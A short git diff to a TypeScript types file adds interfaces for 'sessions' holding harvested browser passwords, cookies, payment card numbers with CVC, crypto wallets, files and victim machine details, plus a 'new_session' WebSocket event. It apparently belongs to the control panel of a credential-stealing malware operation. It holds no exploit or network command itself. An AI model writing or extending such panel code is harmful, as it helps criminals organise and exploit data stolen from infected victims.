@@ -29,6 +29,22 @@ export interface Session {
   created_at: string
 }
 
+export interface SessionListItem extends Session {}
+
+export interface SessionDetail extends SessionListItem {
+  system_info?: SystemInfo
+  passwords?: Array<{ id: string; url?: string; username?: string; password_value?: string; browser?: string }>
+  cookies?: Array<{ id: string; domain?: string; name?: string; value?: string; path?: string }>
+  cards?: Array<{ id: string; number?: string; exp_month?: string; exp_year?: string; holder?: string; cvc?: string }>
+  wallets?: Array<{ id: string; name?: string; path?: string }>
+  files?: Array<{ id: string; filename?: string; size?: number }>
+}
+
+export interface SystemInfo {
+  cpu?: string; gpu?: string; ram?: string; os?: string; screen?: string
+  hostname?: string; local_ip?: string; mac?: string
+}
+
 export interface WSMessage {
   type: 'stats_update' | 'new_session' | 'pong'
   data?: unknown
@@ -39,6 +55,14 @@ export interface PaginatedResponse<T> {
   total: number
   page: number
   per_page: number
+}
+
+export interface SessionPage {
+  items: SessionListItem[]
+  total: number
+  page: number
+  limit: number
+  pages: number
 }
 
 export interface ApiError {
